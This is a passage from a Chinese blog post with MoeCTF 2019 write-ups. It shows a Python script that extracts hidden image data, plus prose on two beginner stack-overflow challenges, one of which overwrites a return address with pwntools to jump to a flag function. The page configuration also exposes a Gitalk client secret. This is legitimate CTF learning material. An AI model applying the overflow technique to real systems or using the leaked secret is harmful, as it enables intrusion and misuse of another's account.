</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dic</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">           <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">width</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">height</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">im</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">            <span class="n">ifx</span> <span class="o">=</span> <span class="n">info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">10000</span><span class="o">+</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ifx</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">ifx</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">elif</span> <span class="n">ifx</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR!&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">ifx</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">bit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">px</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                        <span class="k">for</span> <span class="n">color</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">color</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                                <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">                                <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">color</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                                <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="cl">                                <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">px</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not sel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                        <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">px</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">color</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">color</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">                            <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">                            <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">color</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="cl">                            <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">                            <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">px</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not sel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">dat</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">inx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dat</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">inx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag1.jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span>
</span></span></code></pre></div><p>然后把生成的图片拖进<code>WinHex</code>里, 就能看见<code>flag</code>了.</p>
<h2 id="pwn">PWN</h2>
<h3 id="欢迎来到pwn的世界">欢迎来到pwn的世界</h3>
<p>这道题要用<code>nc</code>, 我就复制粘贴进了终端, 然后回车, 提示不要输入太多字母, 然后我百度了好久也没弄懂<code>PWN</code>为何物,于是.. 在某个月黑风高的夜晚我绝望的脸滚键盘, 滚了好多输入, 然后就看见<code>flag</code>蹦了出来&hellip; 后面还跟了一个栈溢出的提示&hellip;</p>
<p>WD**D, <code>pwn</code>是这么玩的啊!</p>
<h3 id="pwn1">pwn1</h3>
<p>这道题入门了分析起来就很简单, 把题目给的程序扔进<code>IDA</code>, 我们发现输入的漏洞在<code>puts()</code>函数, 如果输入过长它会覆盖后面的内容.. 经过查数, 当输入长度为120个<code>A</code>时会溢出到一个函数跳转的地方, 再看<code>IDA</code>, 我们用<code>pwntools</code>封装一下打印<code>flag</code>的函数地址<code>0x00000000004006B6</code>, 把封装好的数据包传给服务器, 完事!</p>
<p>说的不专业不准确就饶了我吧&hellip; 我想睡觉&hellip;</p>
<h1 id="结束">结束</h1>
<p>wdnmd! 我终于写完了!</p>
<p>可以睡觉了…</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2019-09-06</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/moectf_2019_inspirement/" class="prev" rel="prev" title="MoeCTF简记之初识CTF"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>MoeCTF简记之初识CTF</a>
            <a href="/posts/for_shit_http_headers/" class="next" rel="next" title="记一次终极狗屎的HTTP请求头">记一次终极狗屎的HTTP请求头<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.woooo.tech" target="_blank">Reverier-Xu</a></span>&nbsp;|&nbsp;<span class="license">CC-BY-NC-SA 4.0</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                    <span class="icp"><a href="https://beian.miit.gov.cn/">豫ICP备20023182号-2</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.e1f973627089fc121272c24d146e7c52e316a203fcb362eb2f648d803fc0d327.css" integrity="sha256-4flzYnCJ/BIScsJNFG58UuMWogP8s2LrL2SNgD/A0yc="><link rel="stylesheet" href="/lib/katex/katex.min.76e39bd605d45b2d1944123c66608b0c8bb9baeb70720b212571531c7cf9bc2a.css" integrity="sha256-duOb1gXUWy0ZRBI8ZmCLDIu5uutwcgshJXFTHHz5vCo="><script type="text/javascript" src="/lib/gitalk/gitalk.min.3e68fce688cb68f396c11b65309c267b307f420f01cef269e5e4f3bd769801f0.js" integrity="sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.ae2da1bd62c6469ee27770ad1cddf2e8296d8a7f6d85b091463e5200c5e320af.js" integrity="sha256-ri2hvWLGRp7id3CtHN3y6Cltin9thbCRRj5SAMXjIK8="></script><script type="text/javascript" src="/lib/lunr/lunr.min.08a93c0120364b01159db3c287f39b2180bb740334472bda0675bd3f18981676.js" integrity="sha256-CKk8ASA2SwEVnbPCh/ObIYC7dAM0RyvaBnW9PxiYFnY="></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.3d9120fa621da6d613c1698b7014ec6bdf4620366e8f2b7b547059f4b6f6272b.js" integrity="sha256-PZEg+mIdptYTwWmLcBTsa99GIDZujyt7VHBZ9Lb2Jys="></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.706224d8dc5440460f8ed91c1a6aad25d732af6e0ee6fb31151b157ab485babb.js" integrity="sha256-cGIk2NxUQEYPjtkcGmqtJdcyr24O5vsxFRsVerSFurs="></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.e17a1d816e13c0826e0ed7febfabc3277f45571234bde0bf9120829a7169edc9.js" integrity="sha256-4XodgW4TwIJuDtf+v6vDJ39FVxI0veC/kSCCmnFp7ck="></script><script type="text/javascript" src="/lib/typeit/index.umd.807dab627518d7e2864af47389e0f0e5ae825fcb3036681f2312a5629cb2493a.js" integrity="sha256-gH2rYnUY1+KGSvRzieDw5a6CX8swNmgfIxKlYpyySTo="></script><script type="text/javascript" src="/lib/katex/katex.min.eb18207487161674e717087c317db14ac1a62dadaecccb802499ce173bfeb739.js" integrity="sha256-6xggdIcWFnTnFwh8MX2xSsGmLa2uzMuAJJnOFzv+tzk="></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.cb7f4ca60ed5dc3e258415f8c7a3b46d4a93578a52adf83011f18a7f190e7602.js" integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.52ce78fab4860d24ef22128a52ce24ca01368a9034457a565a1d3fccbab0ddbb.js" integrity="sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.5c0a121a8b490afc85860a522347aeb34fb508c6b23044e5d29f6b2194227b51.js" integrity="sha256-XAoSGotJCvyFhgpSI0eus0+1CMayMETl0p9rIZQie1E="></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"gitalk":{"admin":["Reverier-Xu"],"clientID":"04e3a9c7b8514d2532ba","clientSecret":"b55ad7dd220563faca25d9b74dc517fd309dafa9","id":"2019-09-06T18:23:00+08:00","owner":"Reverier-Xu","repo":"blog_comment","title":"MoeCTF 2019 题解"}},"data":{"id-1":"~/Reverier's Blog","id-2":"~/Reverier's Blog"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true,"typeit":{"cursorChar":"\u003cstrong style=\"color: #0078D6;\"\u003e_\u003c/strong\u003e","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":50}};</script><script type="text/javascript" src="/js/theme.min.b0df51c2c57145081cc73960e9aa780e6f5f56d06cf4ef0f96da8ce1619d1e12.js" integrity="sha256-sN9RwsVxRQgcxzlg6ap4Dm9fVtBs9O8PltqM4WGdHhI="></script></body>
</html>
